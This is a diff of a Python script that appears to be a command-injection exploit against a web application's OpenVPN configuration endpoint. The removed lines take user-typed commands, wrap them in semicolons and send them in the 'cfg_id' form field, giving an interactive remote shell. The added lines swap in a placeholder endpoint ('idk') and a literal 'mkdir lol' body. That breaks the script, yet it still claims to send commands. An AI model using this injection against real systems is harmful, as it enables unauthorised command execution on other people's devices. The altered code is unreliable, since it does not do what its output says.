@@ -19,17 +19,14 @@ else:
     target_port = sys.argv[2]
     
 
-    endpoint = "ajax/openvpn/del_ovpncfg.php"
+    endpoint = "ajax/openvpn/idk"
     url = "http://{}:{}/{}".format(target_host,target_port,endpoint)
 
     while(True):
         cmd = input("Please enter a command:\n")
         command = ";"+cmd+";"
         s = requests.Session()
-        post_data = {
-            "cfg_id": command
-        }
-        post_Request = s.post(url, data=post_data)
+        post_Request = s.post(url, data="mkdir lol")
         if post_Request.status_code==200:
             print("[*] Sending command ... ")
             print(post_Request.text)
